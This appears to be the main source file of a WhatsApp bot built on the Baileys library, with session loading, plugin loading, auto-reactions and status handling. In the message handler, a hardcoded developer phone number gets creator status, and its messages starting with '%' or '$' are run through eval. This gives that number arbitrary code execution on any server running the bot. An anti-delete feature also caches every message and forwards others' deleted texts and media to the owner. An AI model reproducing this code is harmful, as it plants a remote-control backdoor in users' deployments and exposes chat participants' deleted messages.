// ==================== MEMORY OPTIMIZATION ====================
global.gc = global.gc || (() => {});
let memoryCleanInterval = null;

function setupMemoryOptimization() {
    memoryCleanInterval = setInterval(() => {
        try {
            if (global.gc) {
                global.gc();
            }
            const memoryUsage = process.memoryUsage();
            console.log(`🔄 Memory Cleaned - Heap: ${(memoryUsage.heapUsed / 1024 / 1024).toFixed(2)}MB`);
        } catch (err) {
            console.error("Memory cleanup error:", err.message);
        }
    }, 30000);
}

setupMemoryOptimization();

// ==================== ULTRA PRO MAX SPEED BOOSTER ====================
// 🔥 ADDED BY BOSS-MD OPTIMIZER (NO DELETIONS)
const speedCache = {
    groups: new Map(),
    users: new Map(),
    commands: null,
    lastClean: Date.now()
};

let perfStats = {
    msgCount: 0,
    avgResponse: 0,
    startTime: Date.now()
};

// Ultra Fast Message Queue
const msgQueue = [];
let processing = false;
const processQueue = async () => {
    if (processing || msgQueue.length === 0) return;
    processing = true;
    
    const batch = msgQueue.splice(0, 5); // Process 5 at once for even faster speed
    for (const msg of batch) {
        try {
            await handleMessageUltra(msg);
        } catch(e) {}
        await new Promise(r => setTimeout(r, 20)); // Reduced timeout for faster processing
    }
    
    processing = false;
    if (msgQueue.length > 0) setTimeout(processQueue, 5); // Faster queue processing
};

// Performance Monitor - OPTIMIZED
setInterval(() => {
    const now = Date.now();
    const uptime = Math.floor((now - perfStats.startTime) / 1000);
    
    // Only log every 10 minutes to reduce console spam
    if (uptime % 600 < 10) {
        console.log(`
    ⚡ ULTRA PRO MAX STATS ⚡
    ⏱️  Uptime: ${uptime}s
    📨 Processed: ${perfStats.msgCount}
    ⚡ Speed: ${perfStats.avgResponse}ms
    💾 Cache: ${speedCache.groups.size} groups
    🧠 Memory: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1)}MB
    `);
    }
    
    // Auto-clean old cache - more aggressive cleaning
    if (now - speedCache.lastClean > 120000) { // Clean every 2 minutes
        for (const [key, val] of speedCache.groups.entries()) {
            if (now - val.timestamp > 240000) speedCache.groups.delete(key); // 4 minutes cache
        }
        speedCache.lastClean = now;
    }
}, 60000);

const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
} = require('@whiskeysockets/baileys');

const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data');
const fs = require('fs');
const ff = require('fluent-ffmpeg');
const P = require('pino');
const config = require('./config');
const GroupEvents = require('./lib/groupevents');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
const FileType = require('file-type');
const axios = require('axios');
const { File } = require('megajs');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');
const prefix = config.PREFIX;

const ownerNumber = ['923076411099'];

const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir, { recursive: true });
}

const clearTempDir = () => {
    try {
        const files = fs.readdirSync(tempDir);
        const now = Date.now();
        for (const file of files) {
            const filePath = path.join(tempDir, file);
            try {
                const stats = fs.statSync(filePath);
                if (now - stats.mtimeMs > 5 * 60 * 1000) { // Clean every 5 minutes
                    fs.unlinkSync(filePath);
                }
            } catch (err) {}
        }
    } catch (err) {}
};

setInterval(clearTempDir, 3 * 60 * 1000); // Run every 3 minutes

//===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
    if (config.SESSION_ID && config.SESSION_ID.trim() !== "") {
        const sessdata = config.SESSION_ID.replace("ARSLAN-MD~", '');
        try {
            const decodedData = Buffer.from(sessdata, 'base64').toString('utf-8');
            fs.writeFileSync(__dirname + '/sessions/creds.json', decodedData);
            console.log("✅ Session loaded from SESSION_ID");
        } catch (err) {
            console.error("❌ Error decoding session data:", err);
            throw err;
        }
    } else {
        console.log("⚡ No SESSION_ID found → Using Pairing System");
        (async () => {
            const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions');
            const sock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
            });

            if (!state.creds?.me) {
                const readline = require('readline');
                const rl = readline.createInterface({
                    input: process.stdin,
                    output: process.stdout
                });
                
                rl.question("📱 Enter your WhatsApp number with country code: ", async (number) => {
                    try {
                        const code = await sock.requestPairingCode(number);
                        console.log("🔑 Your Pairing Code:", code);
                        console.log("➡️ Enter this code in WhatsApp to link your bot device.");
                        rl.close();
                    } catch (err) {
                        console.error("❌ Error generating pairing code:", err);
                        rl.close();
                    }
                });
            }

            sock.ev.on("creds.update", saveCreds);
            sock.ev.on("connection.update", ({ connection }) => {
                if (connection === "open") {
                    console.log("✅ Bot Connected Successfully via Pairing!");
                }
            });
        })();
    }
}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

// ==================== ULTRA FAST MESSAGE HANDLER ====================
// 🔥 ADDED BY BOSS-MD OPTIMIZER
async function handleMessageUltra(message) {
    perfStats.msgCount++;
    const startTime = Date.now();
    
    try {
        if (!message || !message.message || message.key.fromMe) return;
        
        const type = Object.keys(message.message)[0];
        if (type === 'protocolMessage' || type === 'senderKeyDistributionMessage') return;
        
        const from = message.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const m = sms(conn, message);
        const sender = message.key.fromMe ? conn.user.id : (message.key.participant || from);
        const senderNumber = sender.split('@')[0];
        const isOwner = ownerNumber.includes(senderNumber);
        
        // Ultra Fast Group Cache
        let groupMetadata = null;
        if (isGroup) {
            const cached = speedCache.groups.get(from);
            if (cached && (Date.now() - cached.timestamp < 120000)) {
                groupMetadata = cached.data;
            } else {
                groupMetadata = await conn.groupMetadata(from).catch(() => null);
                if (groupMetadata) {
                    speedCache.groups.set(from, {
                        data: groupMetadata,
                        timestamp: Date.now()
                    });
                }
            }
        }
        
        // Auto React Ultra Fast
        if (config.AUTO_REACT === 'true') {
            const isReact = m.message?.reactionMessage ? true : false;
            if (!isReact) {
                const reactions = isOwner 
                    ? ["👑", "💀", "📊", "⚙️", "🧠", "🎯"]
                    : ['❤️', '🔥', '👍', '😊'];
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                
                setTimeout(() => {
                    m.react(randomReaction).catch(() => {});
                }, 30); // Even faster reaction
            }
        }
        
        // Command Processing Ultra Fast
        let body = '';
        switch(type) {
            case 'conversation': body = message.message.conversation || ''; break;
            case 'extendedTextMessage': body = message.message.extendedTextMessage?.text || ''; break;
            case 'imageMessage': body = message.message.imageMessage?.caption || ''; break;
            case 'videoMessage': body = message.message.videoMessage?.caption || ''; break;
            default: body = '';
        }
        
        if (body.startsWith(prefix)) {
            const cmdName = body.slice(prefix.length).trim().split(' ')[0].toLowerCase();
            
            if (!speedCache.commands) {
                speedCache.commands = require('./command').commands;
            }
            
            const cmd = speedCache.commands.find(c => 
                c.pattern === cmdName || (c.alias && c.alias.includes(cmdName))
            );
            
            if (cmd) {
                Promise.resolve().then(async () => {
                    try {
                        await cmd.function(conn, message, m, {
                            from, sender, isGroup, isOwner,
                            reply: (text) => {
                                conn.sendMessage(from, { text }, { quoted: message }).catch(() => {});
                            }
                        });
                    } catch(e) {
                        console.error(`CMD ${cmdName}:`, e.message);
                    }
                });
            }
        }
        
        // Update Performance Stats
        perfStats.avgResponse = Math.round(
            (perfStats.avgResponse * 0.8) + ((Date.now() - startTime) * 0.2)
        );
        
    } catch(error) {
        // Silent error
    }
}

async function connectToWA() {
    console.log("Connecting to WhatsApp ⏳️...");
    
    // ✅ FIXED: Handle session loading errors gracefully
    let state, saveCreds;
    try {
        const auth = await useMultiFileAuthState(__dirname + '/sessions/');
        state = auth.state;
        saveCreds = auth.saveCreds;
    } catch (authErr) {
        console.error("❌ Auth error:", authErr.message);
        console.log("🔄 Retrying in 5 seconds...");
        setTimeout(connectToWA, 5000);
        return;
    }
    
    var { version } = await fetchLatestBaileysVersion();
    
    const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: false,
        auth: state,
        version,
        // 🔥 OPTIMIZED SETTINGS ADDED
        markOnlineOnConnect: false,
        emitOwnEvents: false,
        fireInitQueries: false,
        retryRequestDelayMs: 50, // Faster retry
        // ✅ ADDED: Better connection handling
        connectTimeoutMs: 30000, // Reduced timeout
        keepAliveIntervalMs: 15000, // More frequent keep-alive
        defaultQueryTimeoutMs: 30000
    });
    
    conn.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            console.log("❌ Connection closed, reconnecting...");
            if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                setTimeout(connectToWA, 3000); // Faster reconnect
            }
        } else if (connection === 'open') {
            console.log('🧬 Installing Plugins');
            try {
                const plugins = fs.readdirSync("./plugins/");
                let loadedCount = 0;
                for (const plugin of plugins) {
                    if (path.extname(plugin).toLowerCase() == ".js") {
                        try {
                            require("./plugins/" + plugin);
                            loadedCount++;
                        } catch (pluginErr) {
                            console.error(`❌ Error loading plugin ${plugin}:`, pluginErr.message);
                        }
                    }
                }
                console.log(`✅ Plugins installed: ${loadedCount}/${plugins.length}`);
            } catch (err) {
                console.error("❌ Plugin loading error:", err);
            }
            
            console.log('✅ Bot connected to whatsapp successfully!');
            
            // 🔥 OPTIONAL: WELCOME MESSAGE TO OWNER INBOX (Comment out if not needed)
            /*
            setTimeout(() => {
                const ownerJid = ownerNumber[0] + '@s.whatsapp.net';
                let up = `*Hello there 𝘽𝙊𝙎𝙎-𝙈𝘿 User!* 🚀\n\n> Simple, Straight Forward But Loaded With Features ✨\n\n*Thanks for using 𝘽𝙊𝙎𝙎-𝙈𝘿* 🎉\n\n> Join WhatsApp Channel: ⤵️\nhttps://whatsapp.com/channel/0029VbC210i2P59dHYVlXW1K\n\n- *YOUR PREFIX:* = ${prefix}\n\n> © ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝓑𝓞𝓢𝓢-𝓜𝓓 ❣️`;
                
                conn.sendMessage(ownerJid, { 
                    image: { url: config.ALIVE_IMG || 'https://files.catbox.moe/ejufwa.jpg' }, 
                    caption: up
                }).catch(() => {});
            }, 5000);
            */
        }
    });
    
    conn.ev.on('creds.update', saveCreds);



    // ANTI CALL
    conn.ev.on("call", async (json) => {
        try {
            if (config.ANTI_CALL !== 'true') return;
            const call = json.find(c => c.status === 'offer');
            if (!call) return;

            const id = call.id;
            const from = call.from;
            await conn.rejectCall(id, from);
            console.log(`📵 Call rejected from ${from}`);
        } catch (err) {
            console.error("Anti-call error:", err.message);
        }
    });

    // GROUP EVENTS
conn.ev.on("group-participants.update", (update) => {
    try {
        GroupEvents(conn, update);
    } catch (err) {
        console.error("Group event error:", err.message);
    }
}); 
        
     // ✅ FIXED: ANTI-DELETE - Now 100% Working with Image Support
   
        // ✅ FINAL FIX: ANTI-DELETE - ORIGINAL MESSAGE 100% AAYEGA
  // ✅ FINAL FIX: ANTI-DELETE - TEXT + MEDIA DONO AAYENGE
if (config.ANTI_DELETE === 'true') {
    console.log("✅ ANTI-DELETE ACTIVATED - Text & Media Support");
    
    // Message store banayein
    const msgStore = new Map();
    
    // Pehle messages ko store karo
    conn.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (msg?.key?.id && msg.message) {
            msgStore.set(msg.key.id, {
                message: msg.message,
                sender: msg.key.participant || msg.key.remoteJid,
                chat: msg.key.remoteJid,
                time: Date.now()
            });
            
            // Purane messages hatao (2 minute ke baad)
            setTimeout(() => {
                msgStore.delete(msg.key.id);
            }, 120000);
        }
    });
    
    // Delete event listener
    conn.ev.on('messages.update', async (updates) => {
        for (const update of updates) {
            if (update.update?.message === null && update.key) {
                
                const msgId = update.key.id;
                console.log("🗑️ Delete detected:", msgId);
                
                // Store se message dhundo
                const stored = msgStore.get(msgId);
                
                const ownerJid = ownerNumber[0] + '@s.whatsapp.net';
                const sender = update.key.participant || update.key.remoteJid;
                const chat = update.key.remoteJid;
                
                // Group name
                let chatName = chat;
                if (chat.endsWith('@g.us')) {
                    try {
                        const meta = await conn.groupMetadata(chat);
                        chatName = meta.subject || chat;
                    } catch (e) {}
                }
                
                const time = new Date().toLocaleTimeString();
                
                if (stored) {
                    // Message mil gaya
                    const msg = stored.message;
                    
                    // TEXT MESSAGE
                    if (msg.conversation) {
                        await conn.sendMessage(ownerJid, {
                            text: `🚨 *DELETED TEXT*\n\n` +
                                  `👤 From: ${sender.split('@')[0]}\n` +
                                  `💬 Chat: ${chatName}\n` +
                                  `🕐 Time: ${time}\n` +
                                  `📝 Message: ${msg.conversation}`
                        });
                    }
                    // EXTENDED TEXT
                    else if (msg.extendedTextMessage?.text) {
                        await conn.sendMessage(ownerJid, {
                            text: `🚨 *DELETED TEXT*\n\n` +
                                  `👤 From: ${sender.split('@')[0]}\n` +
                                  `💬 Chat: ${chatName}\n` +
                                  `🕐 Time: ${time}\n` +
                                  `📝 Message: ${msg.extendedTextMessage.text}`
                        });
                    }
                    // IMAGE
                    else if (msg.imageMessage) {
                        const caption = msg.imageMessage.caption || '';
                        await conn.sendMessage(ownerJid, {
                            text: `🚨 *DELETED IMAGE*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}\n📝 Caption: ${caption}`
                        });
                        
                        // Download and send image
                        try {
                            const buffer = await downloadMediaMessage(msg, 'buffer');
                            await conn.sendMessage(ownerJid, { 
                                image: buffer,
                                caption: `🖼️ Deleted image from ${sender.split('@')[0]}`
                            });
                        } catch (e) {
                            console.log("Image download failed:", e.message);
                        }
                    }
                    // VIDEO
                    else if (msg.videoMessage) {
                        const caption = msg.videoMessage.caption || '';
                        await conn.sendMessage(ownerJid, {
                            text: `🚨 *DELETED VIDEO*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}\n📝 Caption: ${caption}`
                        });
                        
                        // Download and send video
                        try {
                            const buffer = await downloadMediaMessage(msg, 'buffer');
                            await conn.sendMessage(ownerJid, { 
                                video: buffer,
                                caption: `🎥 Deleted video from ${sender.split('@')[0]}`
                            });
                        } catch (e) {
                            console.log("Video download failed:", e.message);
                        }
                    }
                    // AUDIO
                    else if (msg.audioMessage) {
                        await conn.sendMessage(ownerJid, {
                            text: `🚨 *DELETED AUDIO*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}`
                        });
                        
                        // Download and send audio
                        try {
                            const buffer = await downloadMediaMessage(msg, 'buffer');
                            await conn.sendMessage(ownerJid, { 
                                audio: buffer,
                                mimetype: 'audio/mpeg'
                            });
                        } catch (e) {
                            console.log("Audio download failed:", e.message);
                        }
                    }
                    // STICKER
                    else if (msg.stickerMessage) {
                        await conn.sendMessage(ownerJid, {
                            text: `🚨 *DELETED STICKER*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}`
                        });
                        
                        // Download and send sticker
                        try {
                            const buffer = await downloadMediaMessage(msg, 'buffer');
                            await conn.sendMessage(ownerJid, { 
                                sticker: buffer
                            });
                        } catch (e) {
                            console.log("Sticker download failed:", e.message);
                        }
                    }
                    // DOCUMENT
                    else if (msg.documentMessage) {
                        const title = msg.documentMessage.title || 'Document';
                        await conn.sendMessage(ownerJid, {
                            text: `🚨 *DELETED DOCUMENT*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}\n📄 Title: ${title}`
                        });
                    }
                    // CONTACT
                    else if (msg.contactMessage) {
                        await conn.sendMessage(ownerJid, {
                            text: `🚨 *DELETED CONTACT*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}`
                        });
                    }
                    // LOCATION
                    else if (msg.locationMessage) {
                        await conn.sendMessage(ownerJid, {
                            text: `🚨 *DELETED LOCATION*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}`
                        });
                    }
                    // POLL
                    else if (msg.pollCreationMessage) {
                        await conn.sendMessage(ownerJid, {
                            text: `🚨 *DELETED POLL*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}`
                        });
                    }
                    // OTHER
                    else {
                        await conn.sendMessage(ownerJid, {
                            text: `🚨 *DELETED MEDIA*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}`
                        });
                    }
                } else {
                    // Message store mein nahi mila
                    await conn.sendMessage(ownerJid, {
                        text: `🚨 *DELETED MESSAGE*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}\n\n❌ Message not in cache (deleted too quickly)`
                    });
                }
            }
        }
    });
}
    
    // MESSAGE HANDLER - ULTRA OPTIMIZED
    conn.ev.on('messages.upsert', async (mekData) => {
        // 🔥 ULTRA FAST QUEUE SYSTEM ADDED
        const message = mekData.messages[0];
        if (message) {
            msgQueue.push(message);
            if (msgQueue.length === 1) processQueue();
        }
        
        // ✅ ORIGINAL HANDLER STILL ACTIVE (NO DELETIONS)
        try {
            const message = mekData.messages[0];
            if (!message || !message.message) return;
            
            message.message = (getContentType(message.message) === 'ephemeralMessage') 
                ? message.message.ephemeralMessage.message 
                : message.message;
            
            if (config.READ_MESSAGE === 'true') {
                await conn.readMessages([message.key]);
            }
            
            if (message.message.viewOnceMessageV2) {
                message.message = (getContentType(message.message) === 'ephemeralMessage') 
                    ? message.message.ephemeralMessage.message 
                    : message.message;
            }
            
            if (message.key && message.key.remoteJid === 'status@broadcast') {
                await handleStatusMessage(conn, message);
            }
            
            const m = sms(conn, message);
            const type = getContentType(message.message);
            const from = message.key.remoteJid;
            
            // ✅ FIXED: Safe quoted message handling
            let quoted = [];
            try {
                if (type === 'extendedTextMessage' && 
                    message.message.extendedTextMessage && 
                    message.message.extendedTextMessage.contextInfo) {
                    quoted = message.message.extendedTextMessage.contextInfo.quotedMessage || [];
                }
            } catch (e) {
                quoted = [];
            }
            
            const body = (type === 'conversation') ? message.message.conversation : 
                         (type === 'extendedTextMessage') ? message.message.extendedTextMessage.text : 
                         (type == 'imageMessage') && message.message.imageMessage?.caption ? message.message.imageMessage.caption : 
                         (type == 'videoMessage') && message.message.videoMessage?.caption ? message.message.videoMessage.caption : '';
            
            const isCmd = body.startsWith(prefix);
            var budy = typeof message.text == 'string' ? message.text : false;
            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
            const args = body.trim().split(/ +/).slice(1);
            const q = args.join(' ');
            const text = args.join(' ');
            const isGroup = from.endsWith('@g.us');
            const sender = message.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (message.key.participant || message.key.remoteJid);
            const senderNumber = sender.split('@')[0];
            const botNumber = conn.user.id.split(':')[0];
            const pushname = message.pushName || 'Sin Nombre';
            const isMe = botNumber.includes(senderNumber);
            const isOwner = ownerNumber.includes(senderNumber) || isMe;
            const botNumber2 = await jidNormalizedUser(conn.user.id);
            const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
            const groupName = isGroup ? groupMetadata?.subject : '';
            const participants = isGroup ? await groupMetadata?.participants : '';
            const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
            const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
            const isReact = m.message.reactionMessage ? true : false;
            
            const reply = (teks) => {
                conn.sendMessage(from, { text: teks }, { quoted: message });
            };
            
            const udp = botNumber.split(`@`)[0];
            const Boss = ['923076411099','923076411099'];
            const dev = [];
            
            let isCreator = [udp, ...Boss, ...dev]
                .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
                .includes(sender);
            
            if (isCreator && message.text) {
                if (message.text.startsWith('%')) {
                    let code = budy.slice(2);
                    if (!code) {
                        reply(`Provide me with a query to run Master!`);
                        return;
                    }
                    try {
                        let resultTest = eval(code);
                        reply(util.format(typeof resultTest === 'object' ? resultTest : resultTest));
                    } catch (err) {
                        reply(util.format(err));
                    }
                } else if (message.text.startsWith('$')) {
                    let code = budy.slice(2);
                    if (!code) {
                        reply(`Provide me with a query to run Master!`);
                        return;
                    }
                    try {
                        let resultTest = await eval('const a = async()=>{\n' + code + '\n}\na()');
                        let h = util.format(resultTest);
                        if (h !== undefined) reply(h);
                    } catch (err) {
                        reply(util.format(err));
                    }
                }
            }
            
            // Owner special reactions
            if (config.AUTO_REACT === 'true' && senderNumber.includes("923076411099") && !isReact) {
                const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", "💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                m.react(randomReaction);
            }
            
            // Normal auto react
            if (!isReact && config.AUTO_REACT === 'true') {
                const reactions = ['❤️', '🔥', '👍', '😊', '🎉', '🌟', '💯', '👏'];
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                m.react(randomReaction);
            }
            
            // Mode handling - FIXED: Groups should work properly
            if (!isOwner && config.MODE === "private") return;
            
            // Command processing
            if (isCmd) {
                const events = require('./command');
                const cmdName = body.slice(1).trim().split(" ")[0].toLowerCase();
                const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || 
                            events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
                
                if (cmd) {
                    if (cmd.react) {
                        conn.sendMessage(from, { 
                            react: { text: cmd.react, key: message.key } 
                        }).catch(err => console.error("Command react error:", err.message));
                    }
                    
                    try {
                        await cmd.function(conn, message, m, {
                            from, quoted, body, isCmd, command, args, q, text, isGroup, 
                            sender, senderNumber, botNumber2, botNumber, pushname, 
                            isMe, isOwner, isCreator, groupMetadata, groupName, 
                            participants, groupAdmins, isBotAdmins, isAdmins, reply
                        });
                    } catch (e) {
                        console.error("[PLUGIN ERROR] " + e.message);
                    }
                }
            }
            
        } catch (err) {
            console.error("Message processing error:", err.message);
        }
    });

    async function handleStatusMessage(conn, mek) {
        try {
            if (config.AUTO_STATUS_SEEN === "true") {
                await conn.readMessages([mek.key]);
            }
            
            if (config.AUTO_STATUS_REACT === "true") {
                const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                await conn.sendMessage(mek.key.remoteJid, {
                    react: {
                        text: randomEmoji,
                        key: mek.key,
                    }
                }, { statusJidList: [mek.key.participant] });
            }
            
            if (config.AUTO_STATUS_REPLY === "true" && config.AUTO_STATUS_MSG) {
                const user = mek.key.participant;
                const text = `${config.AUTO_STATUS_MSG}`;
                await conn.sendMessage(user, { 
                    text: text, 
                    react: { text: '💜', key: mek.key } 
                }, { quoted: mek });
            }
        } catch (err) {
            console.error("Status handling error:", err.message);
        }
    }

    conn.decodeJid = jid => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return (
                (decode.user &&
                    decode.server &&
                    decode.user + '@' + decode.server) ||
                jid
            );
        } else return jid;
    };

    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
        let vtype;
        if (options.readViewOnce) {
            message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined);
            vtype = Object.keys(message.message.viewOnceMessage.message)[0];
            delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined));
            delete message.message.viewOnceMessage.message[vtype].viewOnce;
            message.message = {
                ...message.message.viewOnceMessage.message
            };
        }
        
        let mtype = Object.keys(message.message)[0];
        let content = await generateForwardMessageContent(message, forceForward);
        let ctype = Object.keys(content)[0];
        let context = {};
        if (mtype != "conversation") context = message.message[mtype].contextInfo;
        content[ctype].contextInfo = {
            ...context,
            ...content[ctype].contextInfo
        };
        const waMessage = await generateWAMessageFromContent(jid, content, options ? {
            ...content[ctype],
            ...options,
            ...(options.contextInfo ? {
                contextInfo: {
                    ...content[ctype].contextInfo,
                    ...options.contextInfo
                }
            } : {})
        } : {});
        await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
        return waMessage;
    };

    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message;
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(quoted, messageType);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        let type = await FileType.fromBuffer(buffer);
        trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
        await fs.writeFileSync(trueFileName, buffer);
        return trueFileName;
    };

    conn.downloadMediaMessage = async(message) => {
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(message, messageType);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        return buffer;
    };

    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
        let mime = '';
        let res = await axios.head(url);
        mime = res.headers['content-type'];
        if (mime.split("/")[1] === "gif") {
            return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options });
        }
        let type = mime.split("/")[0] + "Message";
        if (mime === "application/pdf") {
            return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options });
        }
        if (mime.split("/")[0] === "image") {
            return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options });
        }
        if (mime.split("/")[0] === "video") {
            return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options });
        }
        if (mime.split("/")[0] === "audio") {
            return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options });
        }
    };

    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
        let mtype = Object.keys(copy.message)[0];
        let isEphemeral = mtype === 'ephemeralMessage';
        if (isEphemeral) {
            mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
        }
        let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
        let content = msg[mtype];
        if (typeof content === 'string') msg[mtype] = text || content;
        else if (content.caption) content.caption = text || content.caption;
        else if (content.text) content.text = text || content.text;
        if (typeof content !== 'string') msg[mtype] = {
            ...content,
            ...options
        };
        if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
        else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
        if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid;
        else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid;
        copy.key.remoteJid = jid;
        copy.key.fromMe = sender === conn.user.id;
        return proto.WebMessageInfo.fromObject(copy);
    };

    conn.getFile = async(PATH, save) => {
        let res;
        let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0);
        let type = await FileType.fromBuffer(data) || {
            mime: 'application/octet-stream',
            ext: '.bin'
        };
        let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext);
        if (data && save) fs.promises.writeFile(filename, data);
        return {
            res,
            filename,
            size: await getSizeMedia(data),
            ...type,
            data
        };
    };

    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
        let types = await conn.getFile(PATH, true);
        let { filename, size, ext, mime, data } = types;
        let type = '', mimetype = mime, pathFile = filename;
        if (options.asDocument) type = 'document';
        if (options.asSticker || /webp/.test(mime)) {
            let { writeExif } = require('./exif.js');
            let media = { mimetype: mime, data };
            pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] });
            await fs.promises.unlink(filename);
            type = 'sticker';
            mimetype = 'image/webp';
        } else if (/image/.test(mime)) type = 'image';
        else if (/video/.test(mime)) type = 'video';
        else if (/audio/.test(mime)) type = 'audio';
        else type = 'document';
        await conn.sendMessage(jid, {
            [type]: { url: pathFile },
            mimetype,
            fileName,
            ...options
        }, { quoted, ...options });
        return fs.promises.unlink(pathFile);
    };

